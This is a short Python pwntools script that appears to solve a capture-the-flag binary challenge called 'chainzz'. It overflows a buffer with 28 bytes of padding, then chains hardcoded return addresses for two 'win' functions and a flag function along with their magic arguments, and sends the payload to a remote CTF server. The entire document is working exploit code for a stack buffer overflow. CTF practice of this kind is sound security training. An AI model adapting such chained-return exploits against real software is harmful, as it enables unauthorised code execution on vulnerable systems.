#!/usr/bin/env python

from pwn import remote, process

padding = 'A'*28

win_1 = '\xe6\x85\x04\x08'
win_2 = '\xfd\x85\x04\x08'
flagfnc_addr = '\x66\x86\x04\x08'
win2_arg = '\xAD\xCA\xAC\xBA'
flag_arg = '\xEF\xBE\xAD\xDE'

#r = process('chainzz')
r = remote('ctf.yadunut.com',8008)
r.recv()
r.sendline(padding + win_1 + win_2 + flagfnc_addr + win2_arg + flag_arg)
print r.recv()
